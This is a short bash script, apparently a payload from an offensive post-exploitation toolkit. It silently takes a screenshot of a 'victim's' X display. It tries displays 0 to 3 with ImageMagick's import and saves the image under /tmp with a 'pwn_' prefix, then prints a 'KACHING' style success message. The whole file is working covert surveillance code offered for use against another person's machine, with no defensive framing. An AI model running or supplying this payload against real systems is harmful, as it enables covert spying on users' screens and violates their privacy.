#!/bin/bash
# Made by Optixal

# PAYLOAD INFO:
# Takes a screenshot of victim's screen

# VICTIM'S REQUIREMENTS:
# ImageMagick's import program

# MISC:
# Display variable's format: hostname:D.S
# Hostname is the computer name, omit for localhost
# D is a sequence number for the number of displays connected to the computer
# S is the screen number, as each display can have multiple screens, omit for default 0

# CONFIG:
SIGNATURE=/tmp/pwn_
TRYTILLDISPLAY=3

status="\033[1m\033[94m[*]\033[0m"
good="\033[1m\033[92m[+] SUCCESS:\033[0m"
error="\033[1m\033[91m[-] ERROR:\033[0m"
money="\033[1m\033[92m[$] KACHING:\033[0m"

for ((i=0; i<=$TRYTILLDISPLAY; i++))
do
	if (DISPLAY=":$i" && export DISPLAY && import -window root ${SIGNATURE}ss_$(date +"%Y-%m-%d-%T").png 2> /dev/null)
	then
		echo -e "$good Screenshot captured on display $i... Done."
		exit 0
	else
		echo -e "$error Display $i didn't seem to work, trying display $(($i + 1))..."
	fi
done

exit 1
